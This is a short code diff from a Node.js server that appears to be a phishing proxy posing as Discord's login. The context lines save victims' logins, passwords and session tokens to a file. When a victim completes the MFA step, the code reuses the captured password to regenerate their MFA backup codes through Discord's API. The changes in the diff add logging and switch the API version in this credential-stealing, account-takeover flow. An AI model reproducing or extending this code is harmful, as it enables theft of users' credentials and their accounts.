@@ -122,12 +122,13 @@ if(s.mfa) data.unshift({ticket: s.ticket, password: req.body.password})
 if(!arr.includes(req.body.login)) arr.unshift(`${req.body.login}:${req.body.password}:${s.token}`)
 	fs.writeFileSync("./tokens.txt", arr.join("\n"));
 }
+    console.log(req.originalUrl)
 if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/mfa/totp`){
 var f = data.find(c => c.ticket === req.body.ticket)
 console.log(f)
 if(f){
   console.log(s)
-  let dF = await fetch(('https://discord.com/api/v9/users/@me/mfa/codes'), {
+  let dF = await fetch(('https://discord.com/api/v7/users/@me/mfa/codes'), {
 method: "POST",
 headers: {
 "content-type": "application/json",
@@ -137,7 +138,7 @@ body: JSON.stringify({"password":f.password,"regenerate":true})
 })
   
   let dJ = await dF.json()
-  console.log(dJ)
+  console.log(JSON.stringify(dJ))
     	let tokens;
 	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
 	
